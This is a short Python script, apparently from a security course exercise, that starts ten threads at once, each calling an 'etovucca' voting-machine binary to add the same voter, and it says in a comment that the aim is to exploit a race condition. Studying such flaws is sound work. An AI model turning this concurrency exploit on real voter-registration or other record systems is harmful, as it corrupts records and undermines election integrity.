import subprocess
import threading

PATH_TO_MACHINE = './etovucca'
name = "RaceConditionVoter"
county = "TestCounty"
zip_code = "12345"
dob = "1990-01-01"  

def register_voter():
    try:
        result = subprocess.run(
            [PATH_TO_MACHINE, "add-voter", name, county, zip_code, dob],
            capture_output=True,
            text=True,
        )
        print(result.stdout) 
    except Exception as e:
        print(f"Error occurred: {e}")

NUM_THREADS = 10
threads = []

# Start multiple threads to exploit the race condition
for i in range(NUM_THREADS):
    thread = threading.Thread(target=register_voter)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

